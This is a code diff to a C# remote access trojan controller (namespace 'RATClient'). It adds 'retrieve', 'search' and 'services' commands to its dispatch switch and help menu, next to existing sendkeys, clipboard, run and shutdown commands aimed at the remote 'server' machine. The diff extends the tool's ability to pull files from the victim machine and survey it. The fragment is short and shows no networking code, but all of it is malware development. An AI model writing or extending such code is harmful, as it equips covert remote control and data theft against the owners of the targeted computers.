@@ -44,6 +44,9 @@ namespace RATClient
                     case "shutdown":
                     case "clipboard":
                     case "sendkeys":
+                    case "services":
+                    case "retrieve":
+                    case "search":
                         if (!ConnectCheck()) break;
                         SendCommand(CMDS);
                         break;
@@ -135,11 +138,14 @@ namespace RATClient
             Console.WriteLine("DOWNLOAD       Download A File To The Server");
             Console.WriteLine("EXIT           Quit The Program");
             Console.WriteLine("HELP           List Commands");
-            Console.WriteLine("INFO           Print PC Information");
+            Console.WriteLine("INFO           List Server Information");
             Console.WriteLine("MESSAGE        Send A Message To The Server");
-            Console.WriteLine("PROCESSES      Return A List Of Running Processes");
+            Console.WriteLine("PROCESSES      List Running Processes");
+            Console.WriteLine("RETRIEVE       Download A File From The Server");
             Console.WriteLine("RUN            Run A Program");
+            Console.WriteLine("SEARCH         List The Contents Of A Directory");
             Console.WriteLine("SENDKEYS       Send Key Presses To The Server");
+            Console.WriteLine("SERVICES       List Running Services");
             Console.WriteLine("SHUTDOWN       Shutdown The Server");
         }
         static T DeserializeFromXml<T>(string xml)
